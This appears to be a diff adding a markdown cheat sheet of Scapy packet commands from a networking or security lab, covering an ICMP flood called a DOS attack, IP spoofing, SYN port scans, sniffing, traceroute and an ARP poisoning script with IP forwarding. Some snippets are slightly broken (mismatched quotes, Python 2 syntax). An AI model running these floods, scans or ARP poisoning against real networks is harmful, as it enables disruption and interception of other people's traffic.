@@ -1,0 +1,233 @@
+# 1. DOS attack
+
+```
+`
+ p  = IP(dst = "172.16.12.16")/ICMP()/"Message from dungeon"
+ `
+```
+
+```
+`
+for i in range(10000):
+    send(p)
+hexdump(p)
+p.show()
+
+sendp(IP(dst="1.2.3.4",ttl=(1,4)), iface="eth0")
+`
+```
+
+## More on Pinging:
+
+```
+`
+    arping("192.168.169.*")
+
+    ans,unans=sr(IP(dst="192.168.169.1-20")/ICMP())
+    ans.show()
+    unans.show()
+
+    ans,unans=sr( IP(dst=”10.1.99.*”)/TCP(dport=80, flags=”S”) )
+
+    ans,unans=sr( IP(dst="10.1.99.*"/UDP(dport=0) )
+`
+```
+
+# 2. IP spoofing
+
+```
+`
+p = IP(src = "192.168.169.5", dst="192.168.169.6")/ICMP()/"Hello"
+`
+```
+
+# 3. NMAP using scapy (Port scanner)
+
+```
+`
+    p=sr(IP(dst="192.168.169.6")/TCP(sport=666,dport=[22,80,21,443], flags="S"))
+
+    p, v = sr(IP(dst="192.168.169.4")/TCP(sport=RandShort(), dport=[80, 22, 23, 443]), inter=0.5, retry=2, timeout=1)
+
+    p.summary()
+
+`
+```
+
+# 4. DNS Query:
+## DNS is a UDP packet (port 53)
+## rd=1  Is telling Scapy that recursion is desired
+
+```
+`
+
+p =sr1(IP(dst="192.168.169.1")/UDP()/DNS(rd=1,qd=DNSQR(qname="www.aiktc.org")))
+
+p.show()
+
+sr1(IP(dst="192.168.169.1")/UDP()/DNS(rd=1,qd=DNSQR(qname="aiktc.org",qtype= "NS")))
+`
+```
+
+# 5. Traceroute
+
+```
+`
+
+traceroute(["192.168.169.6", "google.com", "aiktc.org"], dport=[80, 443],  maxttl=20)
+
+traceroute(["192.168.169.4"], dport=22 ,maxttl=20)
+
+ans,unans=_
+
+ans.show()
+unans.show()
+
+`
+```
+
+# 6. Pcap:
+## a) Sniffing
+
+```
+`
+    a = sniff()
+    a.show()
+    type(a)
+    len(a)
+    a[0]
+    a[10]
+
+    a = sniff(iface="eth0", filter="icmp", count=10)
+
+    sniff(filter="icmp and host 66.35.250.151", count=2)
+    `
+```
+
+## b) Reading and Writing pcap
+
+```
+`<br><br>  a = sniff(iface="eth0", filter="icmp", count=10)<br>  wrpcap("test.pcap", a)
+
+  for i in rdpcap():
+      i
+
+  a = Ether()/IP(dst="192.168.169.6")/ICMP()
+
+  wireshark(a)
+
+`
+```
+
+## c) GUI for a packet
+
+```
+`
+    p = rdpcap("test.pcap")
+
+    p[0].pdfdump(layer_shift=1)
+    p[0].psdump("/tmp/test.eps", layer_shift=1)
+
+`
+```
+
+## 7. Pythonic way to deal with packet
+
+```
+`
+    p = IP(dst="www.google.com/30")
+    # Check IP for this domain
+    [i for i in p]
+
+    b=IP(ttl=[1,2,(5,9)])
+    [i for i in b]
+
+    c=TCP(dport=[80,443])
+    [i for i in a/c]
+`
+```
+
+## 8. OS detection
+
+```
+`
+    conf.p0f_base
+    sniff(prn=prnp0f)
+
+
+`
+```
+
+## 9. custom Packet filtering
+** here s is looping for IP and r in looping for TCP**
+
+```
+`
+
+ ans,unans = sr(IP(dst=["192.168.1.1","yahoo.com","slashdot.org"])/TCP(dport=[22,80,443],flags="S"))
+ ans.nsummary(lfilter = lambda (s,r): r.sprintf("%TCP.flags%") == "SA")
+`
+```
+
+** A more advance filtering like port scanner**
+
+```
+`
+
+
+ans.summary(lfilter = lambda (s,r): r.sprintf("%TCP.flags%") == "SA",prn=lambda(s,r):r.sprintf("%TCP.sport% is open")+ " for "+s.sprintf("%IP.dst%"))
+`
+```
+
+## 10. Traceroute with GUI
+**2D**
+
+```
+`
+res,unans = traceroute(["www.microsoft.com","www.cisco.com","www.yahoo.com","www.google.com"],dport=[80,443],maxttl=20)
+res.graph()
+`
+```
+
+**3D**
+
+```
+`
+res.trace3D()
+`
+```
+
+## 11. ARP Poisioning
+
+```
+`
+a = ARP()
+a.show()
+a.psrc = ("192.168.169.1")           #Client IP
+a.pdst = ("192.168.169.6")           #IP to be spoofed
+
+for i in range(1000):
+    send(a)
+IP Forwarding:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+`
+```
+```
+`
+from scapy.all import *
+import time
+
+op=1 # Op code 1 for ARP requests
+victim= "" # Replace with Victim’s IP
+spoof= "" # Replace with Gateway’s IP
+mac= "" # Replace with Attacker’s Phys. Addr.
+
+arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
+
+while 1:
+    send(arp)
+    time.sleep(2)
+`
+```
